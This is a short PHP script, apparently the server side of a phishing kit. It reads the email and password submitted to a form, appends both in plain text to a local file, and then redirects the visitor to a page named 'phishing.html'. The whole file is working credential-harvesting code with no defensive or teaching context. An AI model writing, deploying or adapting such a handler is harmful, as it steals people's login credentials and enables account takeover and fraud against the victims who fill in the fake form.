<?php

    $file = fopen('file.txt','a');

    $email = $_POST['email'];
    $pass = $_POST['password'];

    $texto = "Email: $email, Password: $pass \n";

    fwrite($file,$texto);
    fclose($file);

    header('Location: phishing.html');
    exit();
    
?>